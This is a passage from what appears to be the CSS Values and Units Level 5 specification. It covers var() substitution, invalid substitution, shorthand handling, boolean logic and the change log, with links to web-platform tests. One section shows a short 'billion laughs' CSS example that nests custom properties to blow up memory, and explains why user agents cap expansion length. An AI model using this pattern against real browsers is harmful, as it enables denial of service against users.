- [variable-reference-02.html](https://wpt.fyi/results/css/css-variables/variable-reference-02.html "css/css-variables/variable-reference-02.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-02.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-02.html)
- [variable-reference-03.html](https://wpt.fyi/results/css/css-variables/variable-reference-03.html "css/css-variables/variable-reference-03.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-03.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-03.html)
- [variable-reference-04.html](https://wpt.fyi/results/css/css-variables/variable-reference-04.html "css/css-variables/variable-reference-04.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-04.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-04.html)
- [variable-reference-05.html](https://wpt.fyi/results/css/css-variables/variable-reference-05.html "css/css-variables/variable-reference-05.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-05.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-05.html)
- [variable-reference-12.html](https://wpt.fyi/results/css/css-variables/variable-reference-12.html "css/css-variables/variable-reference-12.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-12.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-12.html)
- [variable-reference-16.html](https://wpt.fyi/results/css/css-variables/variable-reference-16.html "css/css-variables/variable-reference-16.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-16.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-16.html)
- [variable-reference-40.html](https://wpt.fyi/results/css/css-variables/variable-reference-40.html "css/css-variables/variable-reference-40.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-40.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-40.html)
- [variable-reference-refresh.html](https://wpt.fyi/results/css/css-variables/variable-reference-refresh.html "css/css-variables/variable-reference-refresh.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-refresh.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-refresh.html)
- [variable-substitution-background-properties.html](https://wpt.fyi/results/css/css-variables/variable-substitution-background-properties.html "css/css-variables/variable-substitution-background-properties.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-substitution-background-properties.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-substitution-background-properties.html)
- [variable-substitution-basic.html](https://wpt.fyi/results/css/css-variables/variable-substitution-basic.html "css/css-variables/variable-substitution-basic.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-substitution-basic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-substitution-basic.html)
- [variable-substitution-filters.html](https://wpt.fyi/results/css/css-variables/variable-substitution-filters.html "css/css-variables/variable-substitution-filters.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-substitution-filters.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-substitution-filters.html)
- [variable-substitution-replaced-size.html](https://wpt.fyi/results/css/css-variables/variable-substitution-replaced-size.html "css/css-variables/variable-substitution-replaced-size.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-substitution-replaced-size.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-substitution-replaced-size.html)
- [variable-substitution-shadow-properties.html](https://wpt.fyi/results/css/css-variables/variable-substitution-shadow-properties.html "css/css-variables/variable-substitution-shadow-properties.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-substitution-shadow-properties.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-substitution-shadow-properties.html)
- [variable-substitution-variable-declaration.html](https://wpt.fyi/results/css/css-variables/variable-substitution-variable-declaration.html "css/css-variables/variable-substitution-variable-declaration.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-substitution-variable-declaration.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-substitution-variable-declaration.html)

CSSOM

- [variable-reference-cssom.html](https://wpt.fyi/results/css/css-variables/variable-reference-cssom.html "css/css-variables/variable-reference-cssom.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-cssom.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-cssom.html)

------------------------------------------------------------------------

Note that
[substitution](#substitute-arbitrary-substitution-function) takes place at the level of CSS tokens
[\[css-syntax-3\]](#biblio-css-syntax-3 "CSS Syntax Module Level 3"),
not at a textual level; you can't build up a single token where part of
it is provided by a variable:

``` highlight
.foo {
 --gap: 20;
 margin-top: var(--gap)px;
}
```

This is *not* equivalent to setting [margin-top:
20px;](https://drafts.csswg.org/css-box-4/#propdef-margin-top) (a length). Instead, it's equivalent to
[margin-top: 20 px;] (a number
followed by an ident), which is simply an invalid value for the
[margin-top] property. Note,
though, that
[calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) can be used to validly achieve the same thing,
like so:

``` highlight
.foo {
 --gap: 20;
 margin-top: calc(var(--gap) * 1px);
}
```

This also implies that the post-substitution value might not be directly
serializable as-is. Here's a similar example to the preceding:

``` highlight
.foo {
 --gap: 20;
 --not-px-length: var(--gap)px;
}
```

The serialization of the computed (post-substitution) value of
[\--not-px-length] is **not** [20px], because that would
parse back as the single combined dimension; instead, it will serialize
with a comment between the two tokens, like [px], to enforce that
they are separate tokens even when re-parsing.

- [variable-declaration-14.html](https://wpt.fyi/results/css/css-variables/variable-declaration-14.html "css/css-variables/variable-declaration-14.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-14.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-14.html)
- [variable-declaration-53.html](https://wpt.fyi/results/css/css-variables/variable-declaration-53.html "css/css-variables/variable-declaration-53.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-53.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-53.html)
- [variable-declaration-54.html](https://wpt.fyi/results/css/css-variables/variable-declaration-54.html "css/css-variables/variable-declaration-54.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-54.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-54.html)
- [variable-declaration-55.html](https://wpt.fyi/results/css/css-variables/variable-declaration-55.html "css/css-variables/variable-declaration-55.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-declaration-55.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-declaration-55.html)
- [variable-reference-15.html](https://wpt.fyi/results/css/css-variables/variable-reference-15.html "css/css-variables/variable-reference-15.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-15.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-15.html)
- [variable-reference-without-whitespace.html](https://wpt.fyi/results/css/css-variables/variable-reference-without-whitespace.html "css/css-variables/variable-reference-without-whitespace.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-without-whitespace.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-without-whitespace.html)

### [ Invalid Substitution]
When [property
replacement](#property-replacement) results in a property's value containing the
[guaranteed-invalid
value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), this makes the declaration [invalid at computed-value
time]. When this happens, the computed value is one of the
following depending on the property's type:

The property is a non-registered [custom property](https://drafts.csswg.org/css-variables-2/#custom-property)\
The property is a [registered custom property](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property) with [universal syntax](https://drafts.css-houdini.org/css-properties-values-api-1/#universal-syntax-definition)

: The computed value is the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

Otherwise

: Either the property's inherited value or its initial value depending
 on whether the property is inherited or not, respectively, as if the
 property's value had been specified as the
 [unset](https://drafts.csswg.org/css-cascade-5/#valdef-all-unset) keyword.

Tests

- [variables-substitute-guaranteed-invalid.html](https://wpt.fyi/results/css/css-variables/variables-substitute-guaranteed-invalid.html "css/css-variables/variables-substitute-guaranteed-invalid.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variables-substitute-guaranteed-invalid.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variables-substitute-guaranteed-invalid.html)

For example, in the following code:

``` highlight
:root { --not-a-color: 20px; }
p { background-color: red; }
p { background-color: var(--not-a-color); }
```

the \<p\> elements will have transparent backgrounds (the initial value
for
[background-color](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-color)), rather than red backgrounds. The
same would happen if the [custom
property](https://drafts.csswg.org/css-variables-2/#custom-property) itself was unset, or contained an invalid
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) function.

Note the difference between this and what happens if the author had just
written [background-color:
20px](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-color) directly in their stylesheet - that would be
a normal syntax error, which would cause the rule to be discarded, so
the [background-color: red]
rule would be used instead.

 The [invalid at computed-value
time](#invalid-at-computed-value-time) concept exists because [arbitrary substitution
functions](#arbitrary-substitution-function) can't \"fail early\" like other syntax errors can, so
by the time the user agent realizes a property value is invalid, it's
already thrown away the other cascaded values.

### [ Substitution in Shorthand Properties]
[Arbitrary substitution
functions](#arbitrary-substitution-function) produce some complications when parsing [shorthand
properties](https://drafts.csswg.org/css-cascade-5/#shorthand-property) into their component longhands, and when serializing
[shorthand properties] *from* their
component longhands.

If a [shorthand
property](https://drafts.csswg.org/css-cascade-5/#shorthand-property) contains an [arbitrary substitution
function](#arbitrary-substitution-function) in its value, the [longhand
properties](https://drafts.csswg.org/css-cascade-5/#longhand) it's associated with must instead be filled in with a
special, unobservable-to-authors [pending-substitution
value] that indicates the shorthand contains an [arbitrary
substitution function], and
thus the longhand's value can't be determined until after
[substituted](#substitute-arbitrary-substitution-function).

This value must then be cascaded as normal, and at computed-value time,
after
[substitution](#substitute-arbitrary-substitution-function), the shorthand must be parsed and the longhands must be
given their appropriate values at that point.

Tests

- [variable-reference-36.html](https://wpt.fyi/results/css/css-variables/variable-reference-36.html "css/css-variables/variable-reference-36.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-36.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-36.html)
- [variable-reference-37.html](https://wpt.fyi/results/css/css-variables/variable-reference-37.html "css/css-variables/variable-reference-37.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-37.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-37.html)
- [variable-reference-38.html](https://wpt.fyi/results/css/css-variables/variable-reference-38.html "css/css-variables/variable-reference-38.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-reference-38.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-reference-38.html)
- [variable-substitution-shorthands.html](https://wpt.fyi/results/css/css-variables/variable-substitution-shorthands.html "css/css-variables/variable-substitution-shorthands.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-substitution-shorthands.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-substitution-shorthands.html)
- [vars-background-shorthand-001.html](https://wpt.fyi/results/css/css-variables/vars-background-shorthand-001.html "css/css-variables/vars-background-shorthand-001.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/vars-background-shorthand-001.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/vars-background-shorthand-001.html)
- [vars-font-shorthand-001.html](https://wpt.fyi/results/css/css-variables/vars-font-shorthand-001.html "css/css-variables/vars-font-shorthand-001.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/vars-font-shorthand-001.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/vars-font-shorthand-001.html)

 When a shorthand is written without an [arbitrary
substitution
function](#arbitrary-substitution-function), it is parsed and separated out into its component
[longhand
properties](https://drafts.csswg.org/css-cascade-5/#longhand) at parse time; the longhands then participate in the
[cascade](https://drafts.csswg.org/css-cascade-6/#cascade), with the [shorthand
property](https://drafts.csswg.org/css-cascade-5/#shorthand-property) more or less discarded. When the shorthand contains a
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var), however, this can't be done, as the
[var()] could be substituted with anything.

[Pending-substitution
values](#pending-substitution-value) must be serialized as the empty string, if an API
allows them to be observed.

Tests

- [variable-definition-border-shorthand-serialize.html](https://wpt.fyi/results/css/css-variables/variable-definition-border-shorthand-serialize.html "css/css-variables/variable-definition-border-shorthand-serialize.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-definition-border-shorthand-serialize.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-definition-border-shorthand-serialize.html)
- [vars-border-shorthand-serialize.html](https://wpt.fyi/results/css/css-variables/vars-border-shorthand-serialize.html "css/css-variables/vars-border-shorthand-serialize.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/vars-border-shorthand-serialize.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/vars-border-shorthand-serialize.html)

------------------------------------------------------------------------

[Shorthand
properties](https://drafts.csswg.org/css-cascade-5/#shorthand-property) are serialized by gathering the values of their
component [longhand
properties](https://drafts.csswg.org/css-cascade-5/#longhand), and synthesizing a value that will parse into the same
set of values.

If all of the component [longhand
properties](https://drafts.csswg.org/css-cascade-5/#longhand) for a given
[shorthand](https://drafts.csswg.org/css-cascade-5/#shorthand-property) are [pending-substitution
values](#pending-substitution-value) from the same original shorthand value, the [shorthand
property] must serialize to that original
([arbitrary substitution
function](#arbitrary-substitution-function)-containing) value.

Otherwise, if any of the component [longhand
properties](https://drafts.csswg.org/css-cascade-5/#longhand) for a given
[shorthand](https://drafts.csswg.org/css-cascade-5/#shorthand-property) are [pending-substitution
values](#pending-substitution-value), or contain [arbitrary substitution
functions](#arbitrary-substitution-function) of their own that have not yet been
[substituted](#substitute-arbitrary-substitution-function), the [shorthand
property] must serialize to the empty
string.

### [ Safely Handling Overly-Long Substitution]
Naively implemented, some [arbitrary substitution
functions](#arbitrary-substitution-function) (such as
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var)) can be used in a variation of the \"billion
laughs attack\":

```
.foo {
 --prop1: lol;
 --prop2: var(--prop1) var(--prop1);
 --prop3: var(--prop2) var(--prop2);
 --prop4: var(--prop3) var(--prop3);
 /* etc */
}
```

In this short example, [\--prop4]'s computed value is [lol lol lol
lol lol lol lol lol], containing 8 copies of the original
[lol]. Every additional level added to this doubles the number of
identifiers; extending it to a mere 30 levels, the work of a few minutes
by hand, would make [\--prop30] contain *nearly a billion
instances* of the identifier.

To avoid this sort of attack, UAs must impose a UA-defined limit on the
allowed length of the token stream that an [arbitrary substitution
function](#arbitrary-substitution-function) expands into. If an [arbitrary substitution
function] would expand into
a longer token stream than this limit, it instead is replaced with the
[guaranteed-invalid
value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

Tests

- [long-variable-reference-crash.html](https://wpt.fyi/results/css/css-variables/long-variable-reference-crash.html "css/css-variables/long-variable-reference-crash.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/long-variable-reference-crash.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/long-variable-reference-crash.html)
- [variable-exponential-blowup.html](https://wpt.fyi/results/css/css-variables/variable-exponential-blowup.html "css/css-variables/variable-exponential-blowup.html")
 [[(live
 test)]](http://wpt.live/css/css-variables/variable-exponential-blowup.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-variables/variable-exponential-blowup.html)

This specification does not define what size limit should be imposed.
However, since there are valid use-cases for custom properties that
contain a kilobyte or more of text, it's recommended that the limit be
set relatively high.

 The general principle that UAs are allowed to violate
standards due to resource constraints is still generally true here; a UA
might, separately, have limits on how long of a custom property they can
support, or how large of an identifier they can support. This section
calls out this attack specifically because of its long history, and the
fact that it can be done without any of the pieces *seeming* to be too
large on first inspection.

## [ Appendix B: Boolean Logic]
In order to accommodate future extensions of CSS,
[\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) productions generally interpret their
[\<general-enclosed\>](https://drafts.csswg.org/mediaqueries-5/#typedef-general-enclosed) grammar branch as unknown, and their
boolean logic is resolved using 3-value Kleene logic. In some cases
(such as
[\@supports](https://drafts.csswg.org/css-conditional-3/#at-ruledef-supports)),
[\<general-enclosed\>]
is instead defined as false; in which case the logic devolves to
standard boolean algebra.

3-value boolean logic is applied recursively to a boolean condition
`test` as follows:

- A leaf-level `test` resolves to true, false, or unknown, as
 defined by the relevant specification.

- [not `test`] evaluates to true if its contained
 `test` is false, false if it's true, and unknown if it's
 unknown.

- Multiple `test`s connected with [and] evaluate to
 true if *all* of those `test`s are true, false if *any* of
 them are false, and unknown otherwise (i.e. if at least one unknown,
 but no false).

- Multiple `test`s connected with [or] evaluate to true
 if *any* of those `test`s are true, false if *all* of them
 are false, and unknown otherwise (i.e. at least one unknown, but no
 true).

If a "top-level"
[\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) is unknown, and the containing
context doesn't otherwise define how to handle unknown conditions, it
evaluates to false.

 That is, unknown doesn't "escape" a 3-value boolean
expression unless explicitly handled, similar to how `NaN`
doesn't "escape" a [top-level
calculation](https://drafts.csswg.org/css-values-4/#top-level-calculation)).

## [ Acknowledgments]
Firstly, the editors would like to thank all of the contributors to the
[previous level](https://www.w3.org/TR/css-values-4/#acknowledgments) of
this module.

Secondly, we would like to acknowledge Guillaume Lebas, L. David Baron,
Mike Bremford, Sebastian Zartner, and [especially Scott
Kellum](https://github.com/w3c/csswg-drafts/issues/6245) for their
ideas, comments, and suggestions for Level 5;

## [ Changes]
### [ Recent Changes]
Changes since the [11 November 2024 Working
Draft](https://www.w3.org/TR/2024/WD-css-values-5-20241111/):

- Dropped [media-progess()] and
 [container-progress()](https://www.w3.org/TR/css-values-5/#funcdef-container-progress) in favor of using relevant units in
 [progress()](#funcdef-progress). ([Issue
 11826](https://github.com/w3c/csswg-drafts/issues/11826))

See also [earlier
changes](https://www.w3.org/TR/2024/WD-css-values-5-20241111/#changes).

### [ Additions Since Level 4]
Additions since [CSS Values and Units Level
4](http://www.w3.org/TR/css-values-4/):

- Added the "comma-wrapping" notation for function arguments.

- Defined several
 [\<url-modifier\>](https://drafts.csswg.org/css-values-4/#typedef-url-modifier)s for
 [\<url\>](https://drafts.csswg.org/css-values-4/#url-value) functions.

- Extended [\<position\>](#typedef-position) to handle
 [flow-relative](https://drafts.csswg.org/css-writing-modes-4/#flow-relative) positions. ([Issue
 549](https://github.com/w3c/csswg-drafts/issues/549#issuecomment-1823607623))

- Added the [\*-progress()](#progress) family of functions, to represent
 interpolation progress between two values.

- Added the [\*-mix()](#mixing) family of functions, to represent
 actually interpolating between two values.

- Added
 [first-valid()](#funcdef-first-valid), to allow CSS's forward-compatible parsing
 behavior (drop invalid things, go with what's left) to be used with
 custom properties and other contexts where validity isn't known until
 *after* parsing.

- Added [if()](#funcdef-if) for inline conditionals.

- Added [inherit()](#funcdef-inherit).

- Added the [cycle()](#funcdef-cycle) and [attr()](#funcdef-attr) functions.

- Added the [random()](#funcdef-random) and
 [random-item()](#funcdef-random-item) functions.

- Added the
 [sibling-count()](#funcdef-sibling-count) and
 [sibling-index()](#funcdef-sibling-index) functions.

- Added the
 [calc-size()](#funcdef-calc-size) function, and the related
 [interpolate-size](#propdef-interpolate-size) property.

- Added the
 [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) syntax notation to the [value
 definition
 syntax](https://drafts.csswg.org/css-values-4/#css-value-definition-syntax).

## [ Security Considerations]
This specification allows CSS
[\<url\>](https://drafts.csswg.org/css-values-4/#url-value) values to have various aspects of
their request modified. Although this is new to CSS, every ability is
already present in
[`img`](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) or
[`link`](https://html.spec.whatwg.org/multipage/semantics.html#the-link-element), as well as via JavaScript.

The [attr()](#funcdef-attr) function allows HTML attribute values to be used in
CSS values, potentially exposing sensitive information that was
previously not accessible via CSS. See [§ 8.7.2
Security](#attr-security).

## [ Privacy Considerations]
This specification defines units that expose the user's screen size and
default font size, but both are trivially observable from JS, so they do
not constitute a new privacy risk. Similarly the
[media-progress()](https://www.w3.org/TR/css-values-5/#funcdef-media-progress) notation exposes information about the user's
environment and preferences that are already observiable via [media
queries](https://drafts.csswg.org/mediaqueries-5/#media-query).

The [attr()](#funcdef-attr) function allows HTML attribute values to be used in
CSS values, potentially exposing sensitive information that was
previously not accessible via CSS. See [§ 8.7.2
Security](#attr-security).
